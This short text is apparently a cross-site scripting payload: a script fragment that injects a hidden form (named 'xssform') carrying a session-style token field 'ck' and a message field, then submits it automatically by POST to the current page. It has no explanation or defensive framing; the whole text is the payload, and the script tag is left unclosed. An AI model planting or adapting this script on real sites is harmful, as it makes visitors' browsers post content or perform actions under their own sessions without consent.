<script>
var dd = document.createElement("div");
document.body.appendChild(dd);
dd.innerHTML = '<form action="" method="post" id="xssform" name="mbform">'+
'<input type="hidden" value="JiUY" name="ck" />'+
'<input type="text" value="testtesttest" name="mn_text" />'+
'</form>'
document.getElementById("xssform").submit(); 